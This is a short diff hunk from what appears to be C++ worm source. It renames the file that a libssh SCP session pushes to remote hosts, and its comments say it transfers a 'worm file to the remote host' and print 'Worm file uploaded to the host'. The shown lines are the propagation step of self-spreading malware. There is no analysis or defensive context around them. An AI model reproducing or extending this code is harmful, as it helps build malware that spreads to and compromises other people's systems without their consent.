@@ -84,8 +84,8 @@ public:
                             ssh_scp_init(scp_session);  // Initialize SCP
 
                             // Get file size dynamically
-                            size_t file_size = get_file_size("Demon.cpp");
-                           ssh_scp_push_file(scp_session, "Demon.cpp", file_size, S_IRUSR | S_IWUSR);  // Transfer worm file to the remote host
+                            size_t file_size = get_file_size("GhostNet.cpp");
+                           ssh_scp_push_file(scp_session, "GhostNet.cpp", file_size, S_IRUSR | S_IWUSR);  // Transfer worm file to the remote host
                             std::cout << "Worm file uploaded to the host" << std::endl;
                         }
                         ssh_scp_free(scp_session);  // Free SCP session resources
